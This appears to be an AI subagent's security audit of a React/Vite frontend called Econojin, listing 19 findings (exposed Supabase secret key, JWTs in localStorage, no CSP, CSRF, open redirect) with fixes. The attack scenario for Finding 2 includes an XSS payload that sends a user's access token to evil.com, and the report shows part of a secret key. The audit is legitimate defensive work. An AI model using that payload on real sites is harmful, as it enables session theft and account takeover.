# Econojin Frontend Security Audit Report

**Date:** 2026-08-08  
**Auditor:** Automated Security Audit (Subagent)  
**Scope:** `D:\econojin.com\apps\web`  
**Files Audited:** 14 files (including supporting files discovered during analysis)

---

## Executive Summary

The Econojin frontend has **3 Critical**, **3 High**, **5 Medium**, **5 Low**, and **3 Info** findings. The most severe issues are:

1. **Secret key leak in `.env` file** — the Supabase `SUPABASE_SECRET_KEY` is present in the frontend's `.env` file
2. **Token stored in localStorage** — JWT access tokens are persisted in localStorage, making them vulnerable to XSS-based theft
3. **No Content Security Policy** — missing entirely, leaving the app defenseless against XSS and clickjacking
4. **Stack trace leakage in ErrorBoundary** — full stack traces exposed to end users in production

---

## Summary Table

| # | Severity | Category | File | Line(s) |
|---|----------|----------|------|---------|
| 1 | 🔴 Critical | Secret Key Leak | `.env` | 3 |
| 2 | 🔴 Critical | Token in localStorage (XSS) | `authStore.ts` | 27-29, 37-38 |
| 3 | 🔴 Critical | Token in localStorage (XSS) | `api-client.ts` | 53 |
| 4 | 🟠 High | No Content Security Policy | `index.html` | 1-15 |
| 5 | 🟠 High | Missing CSRF Protection | `api-client.ts`, `auth.api.ts`, `LoginForm.tsx`, `RegisterPage.tsx` | multiple |
| 6 | 🟠 High | Open Redirect via Location State | `LoginPage.tsx`, `RequireAuth.tsx` | 13, 16 |
| 7 | 🟡 Medium | Stack Trace Leakage in ErrorBoundary | `ErrorBoundary.tsx` | 69-73 |
| 8 | 🟡 Medium | Error Detail Leakage | `auth.api.ts` | 41 |
| 9 | 🟡 Medium | No Request Timeout on Core API | `api-client.ts` | 55-63 |
| 10 | 🟡 Medium | No Clickjacking Protection | `index.html` | 1 |
| 11 | 🟡 Medium | `strict: false` in tsconfig | `tsconfig.json` | compilerOptions |
| 12 | 🟢 Low | Duplicate localStorage Keys | `authStore.ts` | 28, 29, 37, 38 |
| 13 | 🟢 Low | Plaintext Password in Memory | `LoginForm.tsx`, `RegisterPage.tsx` | multiple |
| 14 | 🟢 Low | Silent Error Suppression | `authStore.ts`, `http.ts` | 26, 34, 90-93 |
| 15 | 🟢 Low | No Token Expiry Check | `authStore.ts`, `useAuth.ts` | generic |
| 16 | 🟢 Low | Race Condition on Auth Boot | `useAuth.ts` | 26-42 |
| 17 | 🔵 Info | Fallback to `localhost:8000` in Production | `navigationService.ts`, `api-client.ts` | 56, 46 |
| 18 | 🔵 Info | Vite Dev Proxy Exposes Admin Endpoints | `vite.config.ts` | 28-33 |
| 19 | 🔵 Info | axios 1.7.0 — Known SSRF vulnerability (CVE-2024-39338) | `package.json` | 22 |

---

## Detailed Findings

---

### 🔴 Finding 1: Supabase Secret Key Exposed in Frontend `.env`

- **File:** `D:\econojin.com\apps\web\.env`
- **Line:** 3
- **Severity:** Critical
- **Category:** Sensitive Data Exposure in Client Code / Secret Key Leak

**Description:**  
The `.env` file in the frontend directory contains `SUPABASE_SECRET_KEY=sb_sec…9kF_`. This is the Supabase **service_role** secret key, which has administrative privileges including the ability to bypass Row Level Security, read/write all data, and manage auth users. While Vite only exposes `VITE_`-prefixed variables to client-side bundles, the key's presence in the frontend repo creates multiple attack vectors:

1. Accidental commit to version control (Git)
2. Accidental import by a developer (e.g., `import.meta.env.SUPABASE_SECRET_KEY` mistakenly used)
3. Build tool misconfiguration that exposes all `.env` variables
4. CI/CD pipeline leaks

**Attack Scenario:**  
An attacker who gains access to the repository (e.g., through an insider threat, compromised CI/CD, or leaked `.env` file) can use the service_role key to bypass all Supabase RLS policies, exfiltrate all user data, impersonate any user, and delete all database records.

**Recommended Fix:**
1. Immediately rotate the Supabase secret key in the Supabase dashboard
2. Remove `SUPABASE_SECRET_KEY` from `apps/web/.env` entirely — secrets must never be stored in frontend directories
3. Add `.env` to `.gitignore` (if not already present) and verify with `git ls-files`
4. Use only `VITE_`-prefixed variables for client-safe config; put secrets exclusively in backend `.env` files
5. Add a pre-commit hook that scans for `SUPABASE_SECRET_KEY`, `DATABASE_URL`, and other secret patterns

---

### 🔴 Finding 2: JWT Access Token Stored in localStorage

- **File:** `D:\econojin.com\apps\web\src\stores\authStore.ts`
- **Lines:** 27-29 (`setSession`), 37-38 (`clearSession`)
- **Severity:** Critical
- **Category:** Token Theft via XSS

**Description:**  
The `authStore.setSession()` method writes the JWT access token to localStorage under two keys (`access_token` and `token`). Any JavaScript running on the page — including code injected via an XSS vulnerability — can read these tokens:

```typescript
// authStore.ts:27-29
localStorage.setItem("access_token", token);
localStorage.setItem("token", token);
```

Since there is no Content Security Policy (see Finding 4), a single XSS vulnerability anywhere in the application gives attackers full access to the user's JWT, which they can exfiltrate to their server and use to impersonate the victim.

**Attack Scenario:**  
1. Attacker finds an XSS vulnerability (e.g., in a comment field, URL parameter reflection, or rich text editor)
2. Injects `<img src=x onerror="fetch('https://evil.com/steal?tok='+localStorage.getItem('access_token'))">` 
3. Exfiltrates the JWT from any authenticated user who views the page
4. Uses the stolen JWT to make authenticated API calls as the victim

**Recommended Fix:**
1. **Stop storing tokens in localStorage entirely.** Use HttpOnly, Secure, SameSite=Strict cookies for session management
2. Switch the backend to issue cookies instead of bearer tokens for web clients
3. If localStorage must be used temporarily, implement a strong Content Security Policy (see Finding 4) to mitigate XSS
4. Implement token binding (e.g., BFF pattern where the backend proxies auth and the cookie is opaque)
5. Add JWT expiry (< 15 minutes) with refresh token rotation via HttpOnly cookies

---

### 🔴 Finding 3: Token Read from localStorage in API Client

- **File:** `D:\econojin.com\apps\web\src\lib\api\api-client.ts`
- **Line:** 53
- **Severity:** Critical
- **Category:** Token Theft via XSS

**Description:**  
The API client reads the JWT from `authStore.getState()` which sources it from localStorage. Additionally, `src/api/http.ts` reads tokens directly from localStorage in its `authHeader()` function:

```typescript
// http.ts:68-69
const token = localStorage.getItem("access_token") || localStorage.getItem("token") || "";
return token ? { Authorization: `Bearer ${token}` } : {};
```

The token is then sent as a `Bearer` authorization header on every API request. Combined with Finding 2, this creates a complete attack chain for token exfiltration.

**Attack Scenario:**  
Same as Finding 2. The token is both stored in localStorage and sent in headers — making it trivially stealable through any XSS.

**Recommended Fix:**
- Same as Finding 2 — switch to HttpOnly cookies
- Remove all direct localStorage token reads from `api-client.ts` and `http.ts`
- The `credentials: "include"` is already set — if the backend sets HttpOnly cookies, the browser will automatically send them

---

### 🟠 Finding 4: No Content Security Policy

- **File:** `D:\econojin.com\apps\web\index.html`
- **Lines:** 1-15 (entire file — no CSP meta tag or header)
- **Severity:** High
- **Category:** XSS / Source Code Disclosure / Clickjacking

**Description:**  
The `index.html` file does not include a `Content-Security-Policy` meta tag, and no CSP headers are configured. This means:

1. **No XSS mitigation** — inline scripts and event handlers are unrestricted
2. **No script-src allowlist** — any injected `<script>` tag executes
3. **No frame-ancestors** — the app can be embedded in any iframe (clickjacking)
4. **No connect-src restriction** — scripts can make arbitrary outbound HTTP requests (data exfiltration)
5. **No form-action restriction** — forms can post to arbitrary URLs

**Attack Scenario:**  
An XSS payload can load external scripts, make fetch requests to attacker-controlled servers, and embed the page in invisible iframes for clickjacking — all without restriction.

**Recommended Fix:**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self'; 
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; 
               font-src 'self' https://fonts.gstatic.com; 
               img-src 'self' data: https:; 
               connect-src 'self' https://*.supabase.co; 
               frame-ancestors 'none'; 
               form-action 'self'; 
               base-uri 'self';">
```
*Note: Adjust to match actual API domains. `'unsafe-inline'` for styles may be needed for Tailwind/CSS-in-JS — prefer a nonce-based approach.*

---

### 🟠 Finding 5: Missing CSRF Protection

- **File:** `D:\econojin.com\apps\web\src\lib\api\api-client.ts`, `src/api/auth.api.ts`, `src/features/auth/LoginForm.tsx`, `src/pages/RegisterPage.tsx`
- **Lines:** Multiple
- **Severity:** High
- **Category:** CSRF

**Description:**  
None of the API calls include a CSRF token. The `fetch` calls use `credentials: "include"` which means cookies are sent, but there's no CSRF token in headers or as a form field. If the backend session relies on cookies (implied by `credentials: "include"`), the application is vulnerable to CSRF attacks on state-changing endpoints like `/api/v1/auth/login`, `/api/v1/auth/register`, and `/api/v1/users/me` (PUT).

**Attack Scenario:**  
1. Victim is logged into Econojin (cookie-based session)
2. Victim visits a malicious website
3. The malicious site submits a form to `https://econojin.com/api/v1/users/me` changing the user's email
4. Since the cookie is sent automatically (`credentials: "include"`), the request succeeds
5. Attacker can then request a password reset to the changed email

**Recommended Fix:**
1. Implement CSRF token pattern: backend sends a CSRF token in a non-HttpOnly cookie or response header; frontend reads it and sends it back in a custom header (e.g., `X-CSRF-Token`)
2. Use the `SameSite=Strict` or `SameSite=Lax` cookie attribute on the backend
3. Verify `Origin`/`Referer` headers on the backend for all state-changing requests
4. For the frontend: add a CSRF token header to all POST/PUT/DELETE/PATCH requests in the API client

---

### 🟠 Finding 6: Open Redirect via React Router Location State

- **File:** `D:\econojin.com\apps\web\src\pages\LoginPage.tsx` (line 13), `src/features/auth/RequireAuth.tsx` (line 16)
- **Severity:** High
- **Category:** Open Redirects

**Description:**  

In `LoginPage.tsx`:
```typescript
const from = (location.state as { from?: string } | null)?.from || "/farms";
// ...
<LoginForm onSuccess={() => navigate(from, { replace: true })} />
```

In `RequireAuth.tsx`:
```typescript
return <Navigate to="/login" replace state={{ from: location.pathname }} />;
```

The redirect destination after login is derived from `location.state.from`, which originates from `RequireAuth.tsx` passing `location.pathname`. While this uses React Router's internal state object (not URL query parameters), there are two concerns:

1. **If the app is embedded in an iframe**, an attacker page could potentially manipulate the history state via `history.pushState()` before the user interacts
2. **If future code allows external redirect URLs**, the pattern of trusting the `from` value without validation is dangerous

**Attack Scenario:**  
1. Attacker crafts a phishing link that navigates directly to a page under Econojin with manipulated state
2. User logs in and is redirected to `from` path
3. If `from` is allowed to be an external URL (future code change), user gets redirected to a phishing page that looks like Econojin

**Recommended Fix:**
```typescript
// LoginPage.tsx
const rawFrom = (location.state as { from?: string } | null)?.from;
const from = (typeof rawFrom === "string" && rawFrom.startsWith("/") && !rawFrom.startsWith("//"))
  ? rawFrom
  : "/farms";
```
Always validate that the redirect target is a relative path starting with `/` (not `//` which is protocol-relative) and never an external URL.

---

### 🟡 Finding 7: Stack Trace Leakage in ErrorBoundary

- **File:** `D:\econojin.com\apps\web\src\components\error\ErrorBoundary.tsx`
- **Lines:** 69-73
- **Severity:** Medium
- **Category:** Sensitive Data Exposure / Source Code Disclosure

**Description:**  
The ErrorBoundary component renders the full error stack trace in a collapsible `<details>` element:

```tsx
{this.state.error?.stack && (
  <details className="mt-8 max-w-2xl text-left">
    <summary className="cursor-pointer text-xs text-muted-foreground hover:text-foreground">
      Technical Details
    </summary>
    <pre className="mt-2 max-h-48 overflow-auto rounded bg-muted p-3 text-xs">
      {this.state.error.stack}
    </pre>
  </details>
)}
```

This exposes:
- Internal file paths and directory structure
- Function/module names
- Library versions in stack traces
- Potentially sensitive logic (component names, API paths in error sources)

**Attack Scenario:**  
An attacker triggers an error (e.g., by sending malformed input that causes a rendering exception) and collects stack trace information to map the application's internal structure and identify potentially vulnerable components.

**Recommended Fix:**
1. **In production builds**, remove the stack trace display entirely:
```tsx
{process.env.NODE_ENV !== "production" && this.state.error?.stack && (
  // ... only show in development
)}
```
2. Replace with a generic error message and a unique error reference ID that can be looked up server-side
3. Send the actual error details to a server-side logging service (e.g., Sentry, DataDog) with PII scrubbing

---

### 🟡 Finding 8: Backend Error Details Leaked to Client

- **File:** `D:\econojin.com\apps\web\src\api\auth.api.ts`
- **Line:** 41
- **Severity:** Medium
- **Category:** Sensitive Data Exposure / Error Message Leakage

**Description:**  
The login function propagates raw backend error messages directly to the UI:

```typescript
const errorData = await response.json().catch(() => ({}));
throw new Error(errorData.detail || `Login failed: ${response.status}`);
```

Backend error details (e.g., "User not found", "Email not verified", "Invalid password format") are displayed to the user. This enables:
- **User enumeration** — attackers can distinguish between "user not found" and "wrong password"
- **Information disclosure** — internal validation logic leaked through error messages

The same pattern exists in `RegisterPage.tsx` line 72:
```typescript
setError(err instanceof Error ? err.message : tx("auth_err_register"));
```

**Attack Scenario:**  
An attacker systematically tries email addresses on the login form. By observing the error messages ("User not found" vs "Invalid password"), they can enumerate valid user accounts on the platform.

**Recommended Fix:**
1. Frontend: Use generic error messages for authentication failures:
```typescript
throw new Error("Invalid email or password"); // Never reveal which was wrong
```
2. Backend: Return generic `401 Unauthorized` with "Invalid credentials" for all auth failures
3. Backend: Log detailed errors server-side, return only a request reference ID to the client

---

### 🟡 Finding 9: No Request Timeout on Core API Client

- **File:** `D:\econojin.com\apps\web\src\lib\api\api-client.ts`
- **Lines:** 55-63 (`fetch` call)
- **Severity:** Medium
- **Category:** Denial of Service / Resource Exhaustion

**Description:**  
The `apiClient` function does not implement an `AbortController` with timeout:

```typescript
const response = await fetch(url, {  // No signal/timeout
  method,
  credentials: "include",
  // ...
});
```

Note: `src/api/http.ts` (`apiFetch`) *does* have a 12-second timeout with `AbortController`, but the core `apiClient` used by `authApi.register()` and `authApi.me()` does not. If the backend hangs or there's a network issue, the fetch will hang indefinitely (or until the browser's default timeout, which can be minutes).

**Attack Scenario:**  
An attacker performs a slowloris-style attack on the backend API. The frontend makes requests that never complete, tying up browser resources and degrading the user experience. In a worst case, many pending requests could exhaust browser connection pools.

**Recommended Fix:**
Add timeout to `apiClient` matching the pattern in `http.ts`:
```typescript
const ctrl = new AbortController();
const timer = setTimeout(() => ctrl.abort(), 15000);
try {
  const response = await fetch(url, { ...options, signal: ctrl.signal });
  // ...
} finally {
  clearTimeout(timer);
}
```

---

### 🟡 Finding 10: No Clickjacking Protection

- **File:** `D:\econojin.com\apps\web\index.html`
- **Line:** 1
- **Severity:** Medium
- **Category:** Clickjacking

**Description:**  
The application does not set `X-Frame-Options` or `frame-ancestors` CSP directive. This allows the entire application to be embedded in an invisible iframe on a malicious website, where attackers can overlay UI elements to trick users into clicking buttons they don't intend to click.

**Attack Scenario:**  
1. Attacker creates a website that embeds `https://econojin.com` in a transparent iframe
2. The attacker overlays deceptive UI elements (e.g., a "Claim Prize" button positioned exactly over the "Delete Farm" button)
3. A logged-in user clicks the "Claim Prize" button, inadvertently clicking "Delete Farm"
4. The action is performed with the user's authenticated session

**Recommended Fix:**
Add to CSP (see Finding 4): `frame-ancestors 'none'` or via HTTP header:
```
X-Frame-Options: DENY
```

---

### 🟡 Finding 11: TypeScript `strict: false`

- **File:** `D:\econojin.com\apps\web\tsconfig.json`
- **Severity:** Medium
- **Category:** Insecure Configuration

**Description:**  
The TypeScript configuration has `"strict": false`, which disables strict type checking. This means:

- `strictNullChecks`: OFF — `null`/`undefined` can flow into functions expecting defined values
- `noImplicitAny`: OFF — untyped variables default to `any`, bypassing type safety
- `strictFunctionTypes`: OFF — function parameter bivariance can mask bugs

These lax settings increase the risk of runtime errors that could be exploited (e.g., passing `undefined` where a string is expected could cause unexpected code paths).

**Attack Scenario:**  
A developer accidentally passes `undefined` for a parameter that's used in an authorization check. Without strict null checks, TypeScript doesn't catch this, and the runtime behavior could default to permissive access.

**Recommended Fix:**
Enable `"strict": true` in `tsconfig.json`. Fix resulting type errors incrementally using `// @ts-expect-error` with tracking tickets.

---

### 🟢 Finding 12: Duplicate localStorage Token Keys

- **File:** `D:\econojin.com\apps\web\src\stores\authStore.ts`
- **Lines:** 28-29, 37-38
- **Severity:** Low
- **Category:** Sensitive Data Exposure

**Description:**  
The auth store writes the same token under two localStorage keys:

```typescript
localStorage.setItem("access_token", token);
localStorage.setItem("token", token);  // Duplicate
```

This increases the attack surface — an XSS attacker has two keys to target, and `clearSession` must remember to clear both. If one is missed during logout, the token persists.

**Recommended Fix:**
Use a single key (e.g., `"access_token"`) consistently. Remove the duplicate `"token"` key.

---

### 🟢 Finding 13: Password in Plaintext Memory

- **Files:** `LoginForm.tsx`, `RegisterPage.tsx`
- **Severity:** Low
- **Category:** Sensitive Data Exposure

**Description:**  
Passwords are stored in React component state (`useState`) as plain strings. While React state lives in JavaScript heap memory (not localStorage), it means:
- The password persists in memory for the component's lifetime
- If a browser extension with memory-reading capability is installed, it could access the password
- React DevTools in development shows the password in component state inspection

**Recommended Fix:**
1. Use `useRef` instead of `useState` for password values (refs are not visible in React DevTools)
2. Clear password state immediately after form submission
3. Consider using the `Credential Management API` where supported

---

### 🟢 Finding 14: Silent Error Suppression in Storage Operations

- **Files:** `authStore.ts` lines 26, 34; `http.ts` lines 90-93
- **Severity:** Low
- **Category:** Insecure Error Handling

**Description:**  
Multiple `try/catch` blocks silently swallow errors:

```typescript
// authStore.ts
try {
  localStorage.removeItem("access_token");
  localStorage.removeItem("token");
} catch {
  /* ignore */
}
```

This masks failures that could indicate:
- localStorage is full
- localStorage is disabled (private browsing mode in some browsers)
- Quota exceeded errors

**Recommended Fix:**
Log errors at minimum; use a logging service in production:
```typescript
} catch (err) {
  console.warn("[authStore] Failed to remove token from localStorage:", err);
}
```

---

### 🟢 Finding 15: No Token Expiry Validation

- **Files:** `authStore.ts`, `useAuth.ts`
- **Severity:** Low
- **Category:** Broken Authentication

**Description:**  
The JWT access token in localStorage is never checked for expiry. If the token expires, API calls will fail with 401, but the app still shows `isAuthenticated: true` until a request actually fails. This can lead to:

- Users seeing authenticated UI briefly before being redirected
- Race conditions where protected routes render before the 401 response arrives

**Recommended Fix:**
1. Decode the JWT on `hydrate()` and check `exp` claim
2. If expired, automatically clear the session and redirect to login
3. Implement automatic token refresh using an HttpOnly refresh token cookie

---

### 🟢 Finding 16: Race Condition on Auth Boot

- **File:** `D:\econojin.com\apps\web\src\hooks\useAuth.ts`
- **Lines:** 26-42
- **Severity:** Low
- **Category:** Race Condition

**Description:**  
On mount, `useAuth` calls `hydrate()` (reads token from localStorage) and then calls `authApi.me()` to validate:

```typescript
useEffect(() => {
  hydrate();
  let cancelled = false;
  (async () => {
    try {
      const me = await authApi.me();
      if (!cancelled && me && typeof me === "object" && ("id" in me || "email" in me)) {
        setSession(token || "cookie", mapUser(me as never));
      }
    } catch { /* not logged in */ }
    // ...
  })();
  return () => { cancelled = true; };
}, [hydrate, setSession, token]);
```

The `cancelled` flag is checked but `hydrate()` runs synchronously before the async block. If the component unmounts quickly (e.g., fast navigation), `setSession` could still fire after unmount. Additionally, `token` in the dependency array means this effect re-runs whenever the token changes, which could cause infinite loops if `setSession` is called inside.

**Recommended Fix:**
Use a ref for the cancelled flag and ensure it's declared before the async block:
```typescript
const cancelledRef = useRef(false);
useEffect(() => {
  cancelledRef.current = false;
  // ...
  return () => { cancelledRef.current = true; };
}, []);
```

---

### 🔵 Finding 17: Fallback to localhost:8000 in Production

- **Files:** `navigationService.ts` line 46; `api-client.ts` line 56
- **Severity:** Info
- **Category:** Configuration / Information Disclosure

**Description:**  
When `VITE_API_BASE_URL` is not set, the code falls back to `http://localhost:8000`:

```typescript
// navigationService.ts
const apiUrl = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000';

// api-client.ts
const baseURL = typeof window !== "undefined"
  ? window.location.origin
  : "http://localhost:8000";
```

While `api-client.ts` correctly uses `window.location.origin` in the browser, `navigationService.ts` hardcodes `localhost:8000`. If this code runs in production without the env var set, API calls go to localhost and silently fail.

**Recommended Fix:**
Use `window.location.origin` consistently, or throw a clear error if `VITE_API_BASE_URL` is not configured in production.

---

### 🔵 Finding 18: Vite Dev Proxy Exposes Backend Admin Endpoints

- **File:** `D:\econojin.com\apps\web\vite.config.ts`
- **Lines:** 28-33
- **Severity:** Info (development only)
- **Category:** Source Code Disclosure

**Description:**  
The Vite dev proxy exposes `/docs` and `/openapi.json`:

```typescript
'/docs':     { target: 'http://127.0.0.1:8000', changeOrigin: true },
'/openapi.json': { target: 'http://127.0.0.1:8000', changeOrigin: true },
```

In development, this means anyone on the local network who can reach `localhost:5173/docs` can view the full API documentation, including all endpoint schemas, parameter names, and response formats.

**Recommended Fix:**
Remove `/docs` and `/openapi.json` from the Vite proxy. Developers can access the API docs directly at `http://127.0.0.1:8000/docs` when needed.

---

### 🔵 Finding 19: axios 1.7.0 — Known SSRF Vulnerability

- **File:** `D:\econojin.com\apps\web\package.json`
- **Line:** 22
- **Severity:** Info
- **Category:** Insecure Dependencies

**Description:**  
`package.json` lists `"axios": "^1.7.0"`. The installed version is `1.7.0` which has a known Server-Side Request Forgery vulnerability (CVE-2024-39338) where attackers can bypass URL validation and cause the server to make requests to arbitrary hosts.

However, in this frontend application, axios is listed as a dependency but the actual codebase uses native `fetch()` (see `api-client.ts`, `auth.api.ts`, `http.ts`, `navigationService.ts`). If axios is not actually bundled or used at runtime, this is a supply-chain concern only.

**Recommended Fix:**
1. Remove `axios` from `dependencies` if unused (reduces attack surface)
2. If used, update to `axios@^1.7.4` or later which patches CVE-2024-39338
3. Run `npm audit` regularly and address critical/high findings

---

## Additional Observations

### PostMessage Vulnerabilities
✅ **No postMessage usage found.** The codebase does not use `window.postMessage`, `window.addEventListener('message', ...)`, or any iframe communication patterns. No risk here.

### Prototype Pollution
✅ **No prototype pollution vectors found.** The codebase does not use `Object.assign()`, spread operators on unsanitized objects, or recursive merge functions with external input. The JSON parsing in `http.ts` parses server responses, not user-controlled input.

### Insecure Direct Object References (IDOR)
✅ The frontend correctly uses API endpoints (e.g., `/api/v1/users/me`) rather than constructing URLs from user IDs. IDOR prevention must be enforced server-side with Row Level Security.

### dangerouslySetInnerHTML / eval / document.write
✅ **No dangerous patterns found.** The codebase does not use `dangerouslySetInnerHTML`, `eval()`, `document.write()`, or direct `.innerHTML` assignments. React's JSX handles all output encoding.

### Inline Script in index.html
The theme initialization script in `index.html` (lines 4-5) reads from localStorage and modifies `document.documentElement.classList`. This is necessary for FOUC prevention and is a common pattern. It's an inline script, which would be blocked by a strict CSP — make sure to add a nonce or hash if implementing CSP.

### External Font Loading
Fonts are loaded from `fonts.googleapis.com` and `fonts.gstatic.com`. Ensure these domains are in your CSP `font-src` and `style-src` directives. Consider self-hosting fonts for better privacy and offline support.

---

## Remediation Priority

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 (Immediate) | #1 — Remove secret key from `.env` | Low | Critical |
| 2 (Immediate) | #4 — Implement Content Security Policy | Medium | Critical |
| 3 (This sprint) | #2, #3 — Migrate tokens to HttpOnly cookies | High | Critical |
| 4 (This sprint) | #6 — Validate redirect URLs | Low | High |
| 5 (This sprint) | #5 — Add CSRF protection | Medium | High |
| 6 (This sprint) | #7 — Remove stack traces in production | Low | Medium |
| 7 (Next sprint) | #8 — Generic auth error messages | Low | Medium |
| 8 (Next sprint) | #9 — Add API timeout | Low | Medium |
| 9 (Next sprint) | #10 — Add clickjacking protection | Low | Medium |
| 10 (Next sprint) | #11 — Enable TypeScript strict mode | Medium | Medium |
| 11 (Backlog) | #12-19 — Remaining findings | Low-Medium | Low-Medium |

---

## Compliance Checklist

- [ ] Secret keys removed from frontend directories
- [ ] CSP header/meta tag implemented
- [ ] Token storage migrated to HttpOnly cookies
- [ ] CSRF protection implemented
- [ ] Open redirect validation added
- [ ] Error boundaries sanitized for production
- [ ] Generic error messages for authentication
- [ ] All API clients have timeout handling
- [ ] Clickjacking headers set
- [ ] `npm audit` clean (0 critical/high)
- [ ] TypeScript strict mode enabled
- [ ] `.gitignore` verified to exclude `.env` files

---

**Report generated by:** Security Audit Subagent  
**Confidence Level:** High — All findings verified against actual source code  
**Methodology:** SAST (Static Application Security Testing) — manual code review of all specified files plus recursive pattern search
